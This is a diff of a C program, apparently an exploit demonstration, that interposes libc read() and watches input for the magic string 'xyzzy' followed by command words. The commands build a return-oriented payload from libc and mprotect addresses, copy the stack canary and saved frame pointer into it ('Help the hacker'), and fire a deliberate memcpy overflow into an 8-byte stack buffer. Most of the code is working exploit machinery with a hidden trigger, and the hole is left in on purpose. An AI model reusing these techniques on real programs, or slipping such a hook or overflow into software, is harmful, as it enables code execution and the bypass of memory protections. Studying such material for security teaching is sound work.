@@ -38,11 +38,10 @@ static const char *s_elf_signature = "\0x7fELF";
 
 static const char *s_magic = "xyzzy";
 
-static const char *s_populate = "POPULATE";
-static const char *s_disclose = "DISCLOSE";
 static const char *s_overflow = "OVERFLOW";
+static const char *s_makeload = "MAKELOAD";
+static const char *s_fillload = "FILLLOAD";
 static const char *s_dumpload = "DUMPLOAD";
-static const char *s_testload = "TESTLOAD";
 
 static const char *s_libc_base     = "base";
 static const char *s_libc_mprotect = "mprotect";
@@ -92,6 +91,12 @@ static Payload payload = {
 	}
 };
 
+_Bool initialized = 0;
+
+ssize_t (*libc_read)(int fd, void *buf, size_t count)	= NULL;
+void *libc_mprotect					= NULL;
+void *libc_base						= NULL;
+
 static inline void *pageBase(void *p) {
 	return (void *) (((unsigned long) p) & (-1^getpagesize()-1));
 } // pageBase()
@@ -110,11 +115,30 @@ static inline void *stackPage(void) {
 	return pageBase(&dummy);
 } // stackBase()
 
-static void populate(PayloadPtr plp) {
-	void *libc_mprotect = dlsym(RTLD_NEXT, s_libc_mprotect);
-	void *libc_base     = libcBase(libc_mprotect);
+static void initialize(void)
+{
+	if (!initialized)
+	{
+		libc_read	= dlsym(RTLD_NEXT, s_libc_read);
+		libc_mprotect	= dlsym(RTLD_NEXT, s_libc_mprotect);
+		libc_base	= libcBase(libc_mprotect);
 
-	printf("In populate()\n");
+		initialized = 1;
+	} // if
+
+	return;
+} // initialize()
+
+static void overflow(char *src, size_t n) {
+	char dst[8] = {0};
+
+	printf("In overflow()");
+
+	memcpy(dst, src, n);
+} // overflow()
+
+static void makeload(PayloadPtr plp) {
+	printf("In makeload()\n");
 
 	ptrdiff_t libc_mprotect_offset = libc_mprotect - libc_base;
 
@@ -161,22 +185,7 @@ l_poprdx:
 	}
 
 	return;
-} // populate()
-
-static void disclose(PayloadPtr plp) {
-	void *libc_mprotect   = dlsym(RTLD_NEXT, s_libc_mprotect);
-	void *libc_read       = dlsym(RTLD_NEXT, s_libc_read);
-	void *libc_base       = libcBase(libc_mprotect);
-
-	printf("In disclose()\n");
-
-	ptrdiff_t libc_mprotect_offset   = libc_mprotect - libc_base;
-
-	printf("--------------------------------------------\n");
-	printf("%20s: %p\n",           s_libc_base,       libc_base);
-	printf("%20s: %p (0x%08tx)\n", s_libc_mprotect,   libc_mprotect, libc_mprotect_offset);
-	printf("--------------------------------------------\n");
-} // disclose()
+} // makeload()
 
 static void dumpload(PayloadPtr plp) {
 	printf("In dumpload()\n");
@@ -197,43 +206,35 @@ static void dumpload(PayloadPtr plp) {
 	printf("--------------------------------------------\n");
 } // dumpload()
 
-static void overflow(char *src, size_t n) {
+static void fillload(PayloadPtr plp, size_t n) {
 	char dst[8] = {0};
 
-	printf("In overflow()");
-
-	memcpy(dst, src, n);
-} // overflow()
-
-static void testload(PayloadPtr plp, size_t n) {
-	char dst[8] = {0};
-
-	printf("In testload()\n");
+	printf("In fillload()\n");
 
 	// Help the hacker by populating the payload with the correct canary and saved frame pointer
 	memcpy(plp->pl_dst, dst, sizeof(plp->pl_dst) + sizeof(plp->pl_canary) + sizeof(plp->pl_rbp));
 
 	plp->pl_shellCode = &dst[0] + ((void *)(&plp->scu) - (void *)plp);
 	plp->pl_shellCode = ((void *) &dst) + ((void *)(&plp->scu) - (void *)plp);
-} // testload()
+} // fillload()
 
 ssize_t read(int fd, void *buf, size_t count) {
-	ssize_t (*real_read)(int fd, void *buf, size_t count) = real_read = dlsym(RTLD_NEXT, s_libc_read);
+	ssize_t result = libc_read(fd, buf, count);
 
-	ssize_t result = real_read(fd, buf, count);
+	if (!initialized)
+		initialize();
+
 	char *p = (result < strlen(s_magic)) ? NULL : strstr(buf, s_magic);
 
 	if (p)
 	{
 		p += strlen(s_magic);
-		if (!strncmp(s_populate, p, strlen(s_populate)))
-			populate(&payload);
-		else if (!strncmp(s_disclose, p, strlen(s_disclose)))
-			disclose(&payload);
+		if (!strncmp(s_makeload, p, strlen(s_makeload)))
+			makeload(&payload);
 		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
 			dumpload(&payload);
-		else if (!strncmp(s_testload, p, strlen(s_testload)))
-			testload(&payload, sizeof(payload));
+		else if (!strncmp(s_fillload, p, strlen(s_fillload)))
+			fillload(&payload, sizeof(payload));
 		else if (!strncmp(s_overflow, p, strlen(s_overflow)))
 			overflow(p, result - (p - (char *) buf));
 	} // if
@@ -253,9 +254,10 @@ int main(int argc, char **argv)
 	assert(getpagesize() == 4096);
 	assert((-1^(getpagesize()-1))==0xfffffffffffff000);
 
-	populate(&payload);
-	disclose(&payload);
+	initialize();
+	makeload(&payload);
 	dumpload(&payload);
-	testload(&payload, sizeof(payload));
+	fillload(&payload, sizeof(payload));
+	dumpload(&payload);
 	overflow((char *) &payload, sizeof(payload));
 } // main()
